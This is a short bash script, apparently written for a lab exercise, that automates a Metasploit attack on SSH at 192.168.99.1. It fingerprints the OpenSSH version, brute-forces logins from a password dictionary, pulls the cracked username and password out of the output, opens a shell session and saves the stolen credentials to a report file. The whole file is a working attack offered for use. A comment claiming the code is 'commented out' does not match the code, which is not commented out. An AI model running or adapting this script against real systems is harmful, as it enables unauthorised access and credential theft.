!/bin/bash -x

# variables
compromisedUsername=""
compromisedPassword=""
sshVersion=""

# Find OpenSSH version
sudo service postgresql start
sudo msfdb init
msfconsole -x "\
       db_nmap -Pn -p 22 192.168.99.1;\
       use auxiliary/scanner/ssh/ssh_version;\
       set RHOSTS 192.168.99.1;\
       run;\
       exit -y"  > tmp.txt

sshVersion=$(grep "192.168.99.1:22" tmp.txt | awk -F 'SSH server version: ' '{print $2}' | awk -F ' ' '{print $1}')

# THE ABOVE CODE HAS BEEN TEMPORARILY COMMENTED OUT FOR DEMONSTRATION PURPOSES

# Perform brute force ssh attack
msfconsole -x "\
        use auxiliary/scanner/ssh/ssh_login;\
        set RHOSTS 192.168.99.1;\
        set STOP_ON_SUCCESS true;\
        set USERPASS_FILE ./sshDictionary.txt;\
        run;\
        exit -y"  > tmp.txt
        
compromisedUsername=$(grep "192.168.99.1:22 - Success:" ./tmp.txt | awk -F "'" '{print $2}' | awk -F ':' '{print $1}')
compromisedPassword=$(grep "192.168.99.1:22 - Success:" ./tmp.txt | awk -F "'" '{print $2}' | awk -F ':' '{print $2}')

# Open a session
msfconsole -x "\
        use auxiliary/scanner/ssh/ssh_login;\
        set RHOSTS 192.168.99.1;\
        set USERNAME "$compromisedUsername";\
        set PASSWORD "$compromisedPassword";\
        run;\
        sessions -i 1;\
        exit -y"

# Print the values of the variables to a file
echo "$compromisedUsername" > ./ssh_report.txt
echo "$compromisedPassword" >> ./ssh_report.txt
echo "$sshVersion" >> ./ssh_report.txt

rm tmp.txt

